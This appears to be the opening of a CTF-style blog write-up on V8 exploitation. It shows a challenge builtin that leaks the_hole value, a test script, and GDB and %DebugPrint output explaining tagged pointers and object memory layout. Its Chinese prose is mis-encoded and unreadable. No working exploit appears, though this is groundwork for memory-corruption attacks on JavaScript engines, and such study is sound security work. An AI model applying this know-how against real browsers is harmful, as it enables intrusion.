<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">BUILTIN(ArrayHole)&#123;</span><br><span class="line">    <span class="keyword">uint32_t</span> len = args.length();</span><br><span class="line">    <span class="keyword">if</span>(len &gt; <span class="number">1</span>) <span class="keyword">return</span> ReadOnlyRoots(isolate).undefined_value();</span><br><span class="line">    <span class="keyword">return</span> ReadOnlyRoots(isolate).the_hole_value();</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>‰∏∫ <code>Array</code> ÂÆö‰πâ‰∫Ü‰∏Ä‰∏™ <code>Hole</code> ÊñπÊ≥ïÔºåËé∑Âèñ <code>Hole</code> ÊñπÊ≥ïÁöÑÂèÇÊï∞<ul>
<li>ÂΩìÂèÇÊï∞‰∏™Êï∞Â§ß‰∫é‚Äú1‚ÄùÊó∂ÔºåËøîÂõû <code>undefined_value</code> Êú™Áü•Á±ªÂûã</li>
<li>ÂΩìÂèÇÊï∞‰∏™Êï∞‰∏çÂ§ß‰∫é‚Äú1‚ÄùÊó∂ÔºåËøîÂõû <code>Type::Oddball()</code> ÂºïÁî®Á±ªÂûã</li>
</ul>
</li>
<li>Built-in FunctionsÔºàBuiltinÔºâ‰Ωú‰∏∫V8ÁöÑÂÜÖÂª∫ÂäüËÉΩÔºåÂÆûÁé∞‰∫ÜÂæàÂ§öÈáçË¶ÅÂäüËÉΩ</li>
<li>Builtin ÊòØÁºñËØëÂ•ΩÁöÑÂÜÖÁΩÆ‰ª£Á†ÅÂùóÔºàchunkÔºâÔºåÂ≠òÂÇ®Âú® <code>snapshot_blob.bin</code> Êñá‰ª∂‰∏≠ÔºåV8 ÂêØÂä®Êó∂‰ª•ÂèçÂ∫èÂàóÂåñÊñπÂºèÂä†ËΩΩÔºåËøêË°åÊó∂ÂèØ‰ª•Áõ¥Êé•Ë∞ÉÁî® </li>
</ul>
<p>ÁÆÄÂçïÊù•ËØ¥Ôºå<code>Hole</code> ÊñπÊ≥ïÂ∞±ÊòØËøîÂõû‰∏Ä‰∏™ <code>Oddball</code> ÂºïÁî®Ôºö</p>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">var</span> c = [];</span><br><span class="line"></span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c))</span><br><span class="line"><span class="built_in">console</span>.log(<span class="keyword">typeof</span>(c.hole()))</span><br></pre></td></tr></table></figure>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">‚ûú  hole ./d8 ./<span class="built_in">exp</span>.js</span><br><span class="line">object</span><br><span class="line">undefined</span><br></pre></td></tr></table></figure>
<p>ÂÖàÂ≠¶‰π†ËøôÁØáÊñáÁ´†Ôºå‰∫ÜËß£ V8 ÁöÑÁõ∏ÂÖ≥Áü•ËØÜÂíåÂ∏∏Áî®Âà©Áî®ÊâãÊÆµÔºö</p>
<ul>
<li><a target="_blank" rel="noopener" href="https://faraz.faith/2019-12-13-starctf-oob-v8-indepth/">Âà©Áî® v8Ôºö*CTF 2019 oob-v8 (faraz.faith)</a> </li>
</ul>
<p><strong>Ê†áËÆ∞ÊåáÈíà Tagged Pointer</strong></p>
<p>Tagged Pointer ÊòØ‰∏Ä‰∏™ÊåáÈíàÔºàÂÜÖÂ≠òÂú∞ÂùÄÔºâÔºåÂÆÉÂÖ∑Êúâ‰∏éÂÖ∂ÂÖ≥ËÅîÁöÑÈôÑÂä†Êï∞ÊçÆÔºö</p>
<ul>
<li>Â§ßÂ§öÊï∞‰ΩìÁ≥ªÁªìÊûÑÈÉΩÊòØÂ≠óËäÇÂèØÂØªÂùÄÁöÑÔºàÊúÄÂ∞èÁöÑÂèØÂØªÂùÄÂçïÂÖÉÊòØÂ≠óËäÇÔºâÔºå‰ΩÜÊòØÊüê‰∫õÁ±ªÂûãÁöÑÊï∞ÊçÆÈÄöÂ∏∏‰ºö‰∏éÊï∞ÊçÆÁöÑÂ§ßÂ∞èÂØπÈΩêÔºåËøôÁßçÂ∑ÆÂºÇ‰ΩøÊåáÈíàÁöÑ‰∏Ä‰∫õÊúÄ‰ΩéÊúâÊïà‰ΩçÊú™Ë¢´‰ΩøÁî®ÔºåÂÆÉ‰ª¨ÂèØ‰ª•Áî®‰∫éÊ†áÁ≠æ-ÈÄöÂ∏∏Áî®‰Ωú‰ΩçÂ≠óÊÆµÔºàÊØè‰∏™‰ΩçÊòØ‰∏Ä‰∏™ÂçïÁã¨ÁöÑÊ†áÁ≠æÔºâÔºåÂè™Ë¶Å‰ΩøÁî®ËØ•ÊåáÈíàÁöÑ‰ª£Á†ÅÂú®ËÆøÈóÆÂâçÂ∞ÜËøô‰∫õ‰ΩçÂ±èËîΩÊéâÂç≥ÂèØ</li>
<li>Áõ∏ÂèçÔºåÂú®Êüê‰∫õÊìç‰ΩúÁ≥ªÁªü‰∏≠ÔºåËôöÊãüÂú∞ÂùÄÁöÑÂÆΩÂ∫¶ÊØîÊï¥‰∏™‰ΩìÁ≥ªÁªìÊûÑÁöÑÂÆΩÂ∫¶Á™ÑÔºå‰ªéËÄå‰ΩøÊúÄÈ´òÊúâÊïà‰ΩçÂèØÁî®‰∫éÊ†áÁ≠æÔºàÊ≥®ÊÑèÔºåÊüê‰∫õÂ§ÑÁêÜÂô®ÁâπÂà´Á¶ÅÊ≠¢Âú®Â§ÑÁêÜÂô®Á∫ßÂà´‰ΩøÁî®Ê≠§Á±ªÊ†áËÆ∞ÊåáÈíàÔºåÂ∞§ÂÖ∂ÊòØ x86-64ÔºåËøôË¶ÅÊ±ÇÊìç‰ΩúÁ≥ªÁªü‰ΩøÁî®ËßÑËåÉÂΩ¢ÂºèÁöÑÂú∞ÂùÄÔºå‰∏îÊúÄÈ´òÊúâÊïà‰ΩçÂÖ®‰∏∫0ÊàñÂÖ®‰∏∫1Ôºâ</li>
</ul>
<p><strong>JS ÂØπË±°ÂÜÖÂ≠ò‰ø°ÊÅØÂ∏ÉÂ±Ä</strong></p>
<p>ÂèØ‰ª•Áõ¥Êé•‰ΩøÁî® GDB Êù•Êü•ÁúãÂÜÖÂ≠òÂ∏ÉÂ±ÄÔºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; <span class="built_in">set</span> args --allow-natives-syntax --shell ./<span class="built_in">exp</span>.js </span><br><span class="line">pwndbg&gt; run</span><br><span class="line">Starting program: /home/yhellow/tools/v8/v8/out.gn/x64.release/d8 --allow-natives-syntax</span><br><span class="line">[Thread debugging <span class="keyword">using</span> libthread_db enabled]</span><br><span class="line">Using host libthread_db library <span class="string">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span>.</span><br><span class="line">[New Thread <span class="number">0x7f16e408e700</span> (LWP <span class="number">6736</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e388d700</span> (LWP <span class="number">6737</span>)]</span><br><span class="line">[New Thread <span class="number">0x7f16e308c700</span> (LWP <span class="number">6738</span>)]</span><br><span class="line">V8 version <span class="number">11.0</span><span class="number">.0</span> (candidate)</span><br></pre></td></tr></table></figure>
<ul>
<li>ÊµãËØïÁî® JavaScript ‰ª£Á†ÅÂ¶Ç‰∏ãÔºö</li>
</ul>
<figure class="highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">Foo</span>(<span class="params">properties, elements</span>) </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="built_in">this</span>[i] = <span class="string">`element<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">let</span> i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="built_in">this</span>[<span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>] = <span class="string">`property<span class="subst">$&#123;i&#125;</span>`</span>&#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">const</span> key <span class="keyword">in</span> foo) &#123;</span><br><span class="line">    <span class="built_in">console</span>.log(<span class="string">`key:<span class="subst">$&#123;key&#125;</span>, value:<span class="subst">$&#123;foo[key]&#125;</span>`</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Â∞ùËØïÂú® GDB ‰∏≠ÊâìÂç∞‰ø°ÊÅØ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br></pre></td><td class="code"><pre><span class="line">d8&gt; <span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;<span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;&#125;</span><br><span class="line">undefined</span><br><span class="line">d8&gt; <span class="keyword">const</span> foo = <span class="keyword">new</span> Foo(<span class="number">12</span>, <span class="number">12</span>)</span><br><span class="line">undefined</span><br><span class="line">d8&gt; %DebugPrint(foo);</span><br><span class="line">DebugPrint: <span class="number">0x1dfe0004d74d</span>: [JS_OBJECT_TYPE]</span><br><span class="line"> - <span class="built_in">map</span>: <span class="number">0x1dfe0019b715</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt; [FastProperties]</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; [HOLEY_ELEMENTS]</span><br><span class="line"> - properties: <span class="number">0x1dfe0004de81</span> &lt;PropertyArray[<span class="number">3</span>]&gt;</span><br><span class="line"> - All own properties (excluding elements): &#123;</span><br><span class="line">    <span class="number">0x1dfe0019b30d</span>: [String] in OldSpace: #property0: <span class="number">0x1dfe0004d8dd</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property0&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">0</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b371</span>: [String] in OldSpace: #property1: <span class="number">0x1dfe0004d945</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property1&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">1</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3b1</span>: [String] in OldSpace: #property2: <span class="number">0x1dfe0004d99d</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property2&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">2</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b3f1</span>: [String] in OldSpace: #property3: <span class="number">0x1dfe0004da01</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property3&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">3</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b431</span>: [String] in OldSpace: #property4: <span class="number">0x1dfe0004da71</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property4&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">4</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b471</span>: [String] in OldSpace: #property5: <span class="number">0x1dfe0004daed</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property5&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">5</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b4b1</span>: [String] in OldSpace: #property6: <span class="number">0x1dfe0004db75</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property6&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">6</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b5cd</span>: [String] in OldSpace: #property7: <span class="number">0x1dfe0004dc09</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property7&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">7</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b63d</span>: [String] in OldSpace: #property8: <span class="number">0x1dfe0004dce1</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property8&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">8</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b67d</span>: [String] in OldSpace: #property9: <span class="number">0x1dfe0004dd99</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;property9&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">9</span>), location: in-object</span><br><span class="line">    <span class="number">0x1dfe0019b6bd</span>: [String] in OldSpace: #property10: <span class="number">0x1dfe0004ddc9</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property10&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">10</span>), location: properties[<span class="number">0</span>]</span><br><span class="line">    <span class="number">0x1dfe0019b6fd</span>: [String] in OldSpace: #property11: <span class="number">0x1dfe0004dead</span> &lt;String[<span class="number">10</span>]: <span class="string">&quot;property11&quot;</span>&gt; (<span class="keyword">const</span> data field <span class="number">11</span>), location: properties[<span class="number">1</span>]</span><br><span class="line"> &#125;</span><br><span class="line"> - elements: <span class="number">0x1dfe0004d795</span> &lt;FixedArray[<span class="number">17</span>]&gt; &#123;</span><br><span class="line">           <span class="number">0</span>: <span class="number">0x1dfe0004d781</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element0&quot;</span>&gt;</span><br><span class="line">           <span class="number">1</span>: <span class="number">0x1dfe0004d7e1</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element1&quot;</span>&gt;</span><br><span class="line">           <span class="number">2</span>: <span class="number">0x1dfe0004d7f5</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element2&quot;</span>&gt;</span><br><span class="line">           <span class="number">3</span>: <span class="number">0x1dfe0004d809</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element3&quot;</span>&gt;</span><br><span class="line">           <span class="number">4</span>: <span class="number">0x1dfe0004d81d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element4&quot;</span>&gt;</span><br><span class="line">           <span class="number">5</span>: <span class="number">0x1dfe0004d831</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element5&quot;</span>&gt;</span><br><span class="line">           <span class="number">6</span>: <span class="number">0x1dfe0004d845</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element6&quot;</span>&gt;</span><br><span class="line">           <span class="number">7</span>: <span class="number">0x1dfe0004d859</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element7&quot;</span>&gt;</span><br><span class="line">           <span class="number">8</span>: <span class="number">0x1dfe0004d86d</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element8&quot;</span>&gt;</span><br><span class="line">           <span class="number">9</span>: <span class="number">0x1dfe0004d881</span> &lt;String[<span class="number">8</span>]: <span class="string">&quot;element9&quot;</span>&gt;</span><br><span class="line">          <span class="number">10</span>: <span class="number">0x1dfe0004d895</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element10&quot;</span>&gt;</span><br><span class="line">          <span class="number">11</span>: <span class="number">0x1dfe0004d8ad</span> &lt;String[<span class="number">9</span>]: <span class="string">&quot;element11&quot;</span>&gt;</span><br><span class="line">       <span class="number">12</span><span class="number">-16</span>: <span class="number">0x1dfe00002459</span> &lt;the_hole&gt;</span><br><span class="line"> &#125;</span><br><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="keyword">enum</span> length: invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br><span class="line"></span><br><span class="line">&#123;<span class="number">0</span>: <span class="string">&quot;element0&quot;</span>, <span class="number">1</span>: <span class="string">&quot;element1&quot;</span>, <span class="number">2</span>: <span class="string">&quot;element2&quot;</span>, <span class="number">3</span>: <span class="string">&quot;element3&quot;</span>, <span class="number">4</span>: <span class="string">&quot;element4&quot;</span>, <span class="number">5</span>: <span class="string">&quot;element5&quot;</span>, <span class="number">6</span>: <span class="string">&quot;element6&quot;</span>, <span class="number">7</span>: <span class="string">&quot;element7&quot;</span>, <span class="number">8</span>: <span class="string">&quot;element8&quot;</span>, <span class="number">9</span>: <span class="string">&quot;element9&quot;</span>, <span class="number">10</span>: <span class="string">&quot;element10&quot;</span>, <span class="number">11</span>: <span class="string">&quot;element11&quot;</span>, property0: <span class="string">&quot;property0&quot;</span>, property1: <span class="string">&quot;property1&quot;</span>, property2: <span class="string">&quot;property2&quot;</span>, property3: <span class="string">&quot;property3&quot;</span>, property4: <span class="string">&quot;property4&quot;</span>, property5: <span class="string">&quot;property5&quot;</span>, property6: <span class="string">&quot;property6&quot;</span>, property7: <span class="string">&quot;property7&quot;</span>, property8: <span class="string">&quot;property8&quot;</span>, property9: <span class="string">&quot;property9&quot;</span>, property10: <span class="string">&quot;property10&quot;</span>, property11: <span class="string">&quot;property11&quot;</span>&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>ÂÖàÊâìÂç∞ÂØπË±° <code>JS_OBJECT_TYPE</code> ÁöÑ‰ø°ÊÅØÔºö</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">4</span>xw <span class="number">0x1dfe0004d74d</span><span class="number">-1</span> <span class="comment">/* JS_OBJECT_TYPE */</span></span><br><span class="line"><span class="number">0x1dfe0004d74c</span>:	<span class="number">0x0019b715</span>	<span class="number">0x0004de81</span>	<span class="number">0x0004d795</span>	<span class="number">0x0004d8dd</span></span><br></pre></td></tr></table></figure>
<ul>
<li>Ââç3‰∏™Êï∞ÊçÆÂàÜÂà´‰∏∫ <code>map properties elements</code> ÁöÑÂú∞ÂùÄ‰Ωé4Â≠óËäÇ</li>
<li>Ê≥®ÊÑèÔºö<ul>
<li>V8 ‰ΩøÁî®‰∫ÜÊ†áËÆ∞ÊåáÈíàÔºåÂõ†Ê≠§Âú®ÊâìÂç∞ÂâçÈúÄË¶ÅÂÖàÊääÊåáÈíàËøòÂéü</li>
<li>V8 ‰ΩøÁî®‰∫ÜÊåáÈíàÂéãÁº©ÁöÑÊäÄÊúØÔºå‰ªÖÂú®ÂÜÖÂ≠ò‰∏≠Â≠òÂÇ®ÊåáÈíàÁöÑ‰∏ãÈÉ®32‰ΩçÔºåÂπ∂Â∞ÜÂü∫Êú¨È´ò32‰ΩçÂ≠òÂÇ®Âú®ÁâπÂÆöÂØÑÂ≠òÂô®‰∏≠</li>
</ul>
</li>
</ul>
<p>ÊåáÈíà <code>properties</code> Âíå <code>elements</code> ‰∏é V8 ÁöÑ‰∏§ÁßçÂ±ûÊÄßÊúâÂÖ≥Ôºö</p>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function">function <span class="title">Foo</span><span class="params">(properties, elements)</span> </span>&#123;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; elements; i++) &#123;<span class="keyword">this</span>[i] = `element$&#123;i&#125;`&#125;</span><br><span class="line">    <span class="keyword">for</span> (let i = <span class="number">0</span>; i &lt; properties; i++) &#123;<span class="keyword">this</span>[`property$&#123;i&#125;`] = `property$&#123;i&#125;`&#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<ul>
<li>Á¨¨‰∏Ä‰∏™ for Âæ™ÁéØÂÆö‰πâ‰∫Ü <code>elements</code> ‰∏™Êï∞ÁªÑÁ¥¢ÂºïÂ±ûÊÄßÔºàArray-indexed PropertiesÔºâ </li>
<li>Á¨¨‰∫å‰∏™ for Âæ™ÁéØÂÆö‰πâ‰∫Ü <code>properties</code> ‰∏™ÂëΩÂêçÂ±ûÊÄßÔºàNamed PropertiesÔºâ </li>
</ul>
<p>V8 ÈÅçÂéÜÊó∂‰∏ÄËà¨‰ºöÂÖàÈÅçÂéÜÂâçËÄÖÔºåÂâçÂêé‰∏§ËÄÖÂú®Â∫ïÂ±ÇÂ≠òÂÇ®Âú®‰∏§‰∏™ÂçïÁã¨ÁöÑÊï∞ÊçÆÁªìÊûÑ‰∏≠ÔºåÂàÜÂà´Áî® <code>elements</code> Âíå <code>properties</code> ‰∏§‰∏™ÊåáÈíàÊåáÂêëÂÆÉ‰ª¨</p>
<p><img src="/2022/12/02/V8%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA+JavaScript%20pwn+hole%20attack/1669786173114.png" alt="1669786173114"> </p>
<ul>
<li>PSÔºöV8 Êúâ‰∏ÄÁßçÁ≠ñÁï•ÔºåÂ¶ÇÊûúÂëΩÂêçÂ±ûÊÄßÂ∞ë‰∫éÁ≠â‰∫é10‰∏™Êó∂ÔºåÂëΩÂêçÂ±ûÊÄß‰ºöÁõ¥Êé•Â≠òÂÇ®Âà∞ÂØπË±°Êú¨Ë∫´ÔºåËÄåÊó†ÈúÄÂÖàÈÄöËøá properties ÊåáÈíàÊü•ËØ¢ÔºàÁõ¥Êé•Â≠òÂÇ®Âà∞ÂØπË±°Êú¨Ë∫´ÁöÑÂ±ûÊÄßË¢´Áß∞‰∏∫ÂØπË±°ÂÜÖÂ±ûÊÄß In-object PropertiesÔºâ</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004d795</span><span class="number">-1</span> <span class="comment">/* elements */</span></span><br><span class="line"><span class="number">0x1dfe0004d794</span>:	<span class="number">0x00002231</span>	<span class="number">0x00000022</span>	<span class="number">0x0004d781</span>	<span class="number">0x0004d7e1</span></span><br><span class="line"><span class="number">0x1dfe0004d7a4</span>:	<span class="number">0x0004d7f5</span>	<span class="number">0x0004d809</span>	<span class="number">0x0004d81d</span>	<span class="number">0x0004d831</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ªéÁ¨¨3‰∏™ÊåáÈíàÂºÄÂßãÔºåÂ∞±ÊòØÔºö[<code>element0</code>Ôºö<code>element11</code>]</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">pwndbg&gt; x/<span class="number">8</span>xw <span class="number">0x1dfe0004de81</span><span class="number">-1</span> <span class="comment">/* properties */</span></span><br><span class="line"><span class="number">0x1dfe0004de80</span>:	<span class="number">0x00002d19</span>	<span class="number">0x00000006</span>	<span class="number">0x0004ddc9</span>	<span class="number">0x0004dead</span></span><br><span class="line"><span class="number">0x1dfe0004de90</span>:	<span class="number">0x000023e1</span>	<span class="number">0x00002715</span>	<span class="number">0xd12b3982</span>	<span class="number">0x0000000a</span></span><br></pre></td></tr></table></figure>
<ul>
<li>‰ªéÁ¨¨3‰∏™ÊåáÈíàÂºÄÂßãÔºåÂ∞±ÊòØÔºö[<code>property10</code>Ôºö<code>property11</code>]ÔºàÂâç10‰∏™ÈÉΩÊòØÂØπË±°ÂÜÖÂ±ûÊÄßÔºâ</li>
</ul>
<p>ÂØπË±°ÁöÑÊò†Â∞Ñ <code>map</code> ÊòØ‰∏ÄÁßçÁâπÊÆäÁöÑÂ±ûÊÄßÔºåÂÖ∂‰∏≠ÂåÖÂê´‰ª•‰∏ã‰ø°ÊÅØÔºö</p>
<ul>
<li>ÂØπË±°ÁöÑÂä®ÊÄÅÁ±ªÂûãÔºåÂç≥ <code>String Uint8Array HeapNumber ...</code></li>
<li>ÂØπË±°ÁöÑÂ§ßÂ∞èÔºà‰ª•Â≠óËäÇ‰∏∫Âçï‰ΩçÔºâ</li>
<li>ÂØπË±°ÁöÑÂ±ûÊÄßÂèäÂÖ∂Â≠òÂÇ®‰ΩçÁΩÆ</li>
<li>Êï∞ÁªÑÂÖÉÁ¥†ÁöÑÁ±ªÂûãÔºå‰æãÂ¶ÇÊú™Ë£ÖÁÆ±ÁöÑÂèåÁ≤æÂ∫¶ÊàñÊ†áËÆ∞ÁöÑÊåáÈíà</li>
<li>ÂØπË±°ÁöÑÂéüÂûã</li>
</ul>
<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0x1dfe0019b715</span>: [Map] in OldSpace</span><br><span class="line"> - type: JS_OBJECT_TYPE</span><br><span class="line"> - instance size: <span class="number">52</span></span><br><span class="line"> - inobject properties: <span class="number">10</span></span><br><span class="line"> - elements kind: HOLEY_ELEMENTS</span><br><span class="line"> - unused property fields: <span class="number">1</span></span><br><span class="line"> - <span class="class"><span class="keyword">enum</span> <span class="title">length</span>:</span> invalid</span><br><span class="line"> - stable_map</span><br><span class="line"> - back pointer: <span class="number">0x1dfe0019b6d5</span> &lt;Map[<span class="number">52</span>](HOLEY_ELEMENTS)&gt;</span><br><span class="line"> - prototype_validity cell: <span class="number">0x1dfe0019b635</span> &lt;Cell value= <span class="number">0</span>&gt;</span><br><span class="line"> - instance descriptors (own) #<span class="number">12</span>: <span class="number">0x1dfe0004dde1</span> &lt;DescriptorArray[<span class="number">12</span>]&gt;</span><br><span class="line"> - prototype: <span class="number">0x1dfe0004d6c9</span> &lt;Object <span class="built_in">map</span> = <span class="number">0x1dfe0019b5e5</span>&gt;</span><br><span class="line"> - constructor: <span class="number">0x1dfe0019a005</span> &lt;JSFunction Foo (sfi = <span class="number">0x1dfe00199f45</span>)&gt;</span><br><span class="line"> - dependent code: <span class="number">0x1dfe000021e1</span> &lt;Other heap object (WEAK_ARRAY_LIST_TYPE)&gt;</span><br><span class="line"> - construction counter: <span class="number">6</span></span><br></pre></td></tr></table></figure>
<ul>
